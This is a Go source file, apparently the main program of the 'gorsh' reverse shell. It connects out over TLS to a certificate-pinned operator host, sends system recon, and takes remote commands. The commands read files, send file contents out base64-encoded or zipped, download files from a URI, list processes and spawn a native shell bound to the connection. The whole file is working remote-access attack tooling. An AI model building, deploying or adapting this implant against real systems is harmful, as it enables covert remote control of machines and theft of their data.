package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"os/user"
	"strings"

	"code.cloudfoundry.org/bytefmt"
	"github.com/audibleblink/gorsh/internal/fetch"
	"github.com/audibleblink/gorsh/internal/shell"
	"github.com/audibleblink/gorsh/internal/sitrep"
	"github.com/audibleblink/gorsh/internal/zip"
)

const (
	ERR_COULD_NOT_DECODE = 1 << iota
	ERR_HOST_UNREACHABLE = iota
	ERR_BAD_FINGERPRINT  = iota
)

var (
	connectString string
	fingerPrint   string
)

func Encode(path string) (string, error) {
	buff, err := ioutil.ReadFile(path)
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(buff), err
}

func Send(conn net.Conn, msg string) {
	conn.Write([]byte("\n"))
	conn.Write([]byte(msg))
	conn.Write([]byte("\n"))
}

func ListDir(argv []string) (string, error) {
	var path string

	if len(argv) < 2 {
		path = "./"
	} else {
		path = argv[1]
	}

	files, err := ioutil.ReadDir(path)

	if err != nil {
		return "", err
	}

	details := ""

	for _, f := range files {
		perms := f.Mode().String()
		size := bytefmt.ByteSize(uint64(f.Size()))
		modTime := f.ModTime().String()[0:19]
		name := f.Name()
		details = details + perms + "\t" + modTime + "\t" + size + "\t" + name + "\n"
	}

	return details, err
}

// Takes a network connection as its arg so it can pass stdio to it
func InteractiveShell(conn net.Conn) {
	var (
		exit    bool           = false
		name, _                = os.Hostname()
		prompt  string         = fmt.Sprintf("\n[%s]> ", name)
		scanner *bufio.Scanner = bufio.NewScanner(conn)
	)

	// Print basic recon data on first connect
	Send(conn, sitrep.SysInfo())
	conn.Write([]byte(prompt))

	for scanner.Scan() {
		command := scanner.Text()

		if len(command) > 1 {
			argv := strings.Split(command, " ")

			switch argv[0] {
			case "exit":
				exit = true

			case "shell":
				Send(conn, "Mind your OPSEC")
				RunShell(conn)

			case "ls":
				listing, err := ListDir(argv)
				if err != nil {
					Send(conn, err.Error())
				} else {
					Send(conn, listing)
				}

			case "ps":
				listing := sitrep.Processes()
				Send(conn, listing)

			case "cd":
				if len(argv) > 1 {
					os.Chdir(argv[1])
				} else {
					usr, _ := user.Current()
					os.Chdir(usr.HomeDir)
				}
				dir, _ := os.Getwd()
				Send(conn, "Directory: "+dir)

			case "pwd":
				dir, _ := os.Getwd()
				Send(conn, dir)

			case "cat":
				if len(argv) != 2 {
					Send(conn, "Usage: cat <file>")
				} else {

					buf, err := ioutil.ReadFile(argv[1])

					if err != nil {
						Send(conn, err.Error())
					} else {
						Send(conn, string(buf))
					}
				}

			case "base64":
				if len(argv) != 2 {
					Send(conn, "Usage: base64 <file>")
				} else {
					base64, err := Encode(argv[1])

					if err != nil {
						Send(conn, err.Error())
					} else {
						Send(conn, base64)
					}
				}

			case "fetch":
				if len(argv) != 3 {
					Send(conn, "Usage: fetch <URI> <dest file>. "+
						"UNC Paths allowed on Windows")
				} else {
					bytes, err := fetch.Get(argv[1], argv[2])

					if err != nil {
						Send(conn, err.Error())
					} else {
						msg := fmt.Sprintf("%d bytes copied to %s",
							bytes, argv[2])
						Send(conn, msg)
					}
				}

			case "sitrep":
				net := sitrep.SysInfo()
				Send(conn, net)

			case "zipcat":
				if len(argv) != 2 {
					Send(conn, "Usage: zipcat <file>")
				} else {
					bytes, err := zip.Bytes(argv[1])
					if err != nil {
						Send(conn, err.Error())
					} else {
						b64 := base64.StdEncoding.EncodeToString(bytes)
						Send(conn, b64)
					}
				}

			case "help":
				Send(conn, "Currently implemented commands: \n"+
					"cd [path]          -  Change the process' working directory\n"+
					"ls [path]          -  List the current working directory\n"+
					"pwd                -  Print the current working directory\n"+
					"ps                 -  Print process information\n"+
					"cat <file>         -  Print the contents of the given file\n"+
					"zipcat <file>      -  Compress, base64, and print the given file\n"+
					"base64 <file>      -  Base64 encode the given file and print\n"+
					"fetch <URI> <file> -  Fetch stuff. http[s]:// or //share/folder (Windows only)\n"+
					"shell              -  Drops into a native shell. Mind your OPSEC\n"+
					"sitrep             -  Situation Awareness information\n"+
					"\n")
			default:
				Send(conn, "Command not implemented. Try 'help'")
			}

			if exit {
				break
			}

		}

		conn.Write([]byte(prompt))
	}
}

func RunShell(conn net.Conn) {
	var cmd *exec.Cmd = shell.GetShell()
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Stdin = conn
	cmd.Run()
}

func CheckKeyPin(conn *tls.Conn, fingerprint []byte) bool {
	valid := false
	connState := conn.ConnectionState()
	for _, peerCert := range connState.PeerCertificates {
		hash := sha256.Sum256(peerCert.Raw)
		if bytes.Compare(hash[0:], fingerprint) == 0 {
			valid = true
		}
	}
	return valid
}

// Creates the TLS connection before passing it to the InteractiveShell function
func Reverse(connectString string, fingerprint []byte) {
	var (
		conn *tls.Conn
		err  error
	)

	config := &tls.Config{InsecureSkipVerify: true}

	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
		os.Exit(ERR_HOST_UNREACHABLE)
	}

	defer conn.Close()

	if ok := CheckKeyPin(conn, fingerprint); !ok {
		os.Exit(ERR_BAD_FINGERPRINT)
	}

	InteractiveShell(conn)
}

func main() {
	if connectString != "" && fingerPrint != "" {
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		if err != nil {
			os.Exit(ERR_COULD_NOT_DECODE)
		}
		Reverse(connectString, bytesFingerprint)
	}
}
